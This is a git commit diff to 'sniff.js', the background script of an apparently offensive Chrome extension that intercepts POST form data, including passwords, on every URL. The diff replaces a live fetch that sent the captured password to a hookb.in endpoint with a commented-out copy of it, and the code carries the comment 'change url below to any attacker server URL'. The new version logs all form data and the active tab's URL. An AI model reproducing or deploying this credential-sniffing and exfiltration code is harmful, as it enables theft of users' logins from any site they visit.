372662b32eb672cf19aac2dd872ad0da979cc05d
GGB-21 <49618001+GGB-21@users.noreply.github.com>
2020-12-02 13:44:16 +0530

    Added show url

--- Browser_Extension/sniff.js
+++ Browser_Extension/sniff.js
@@ -6,20 +6,25 @@ chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
         });
     }
 });
+
 //sniff form data
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
       if(details.method == "POST") {
-        console.log(JSON.stringify(details.requestBody.formData['password'][0]));
-        //change url below to any attacker server URL
+        chrome.tabs.query({active:true, currentWindow: true}, function(tabs){
+          console.log(tabs[0].url);
+        });
+        var pass = JSON.stringify(details.requestBody.formData);
+        console.log(pass);
+        /*change url below to any attacker server URL
         fetch('https://hookb.in/lJyEQ7JowNIrXXZWdJzr', {
           method: 'post',
           body: details.requestBody.formData['password'][0],
         })
         .then(response => response.json())
-        .then(data => console.log(data));
+        .then(data => console.log(data));*/
       }
     },
     {urls: ["<all_urls>"]},
     ["requestBody"]
-  );
+);
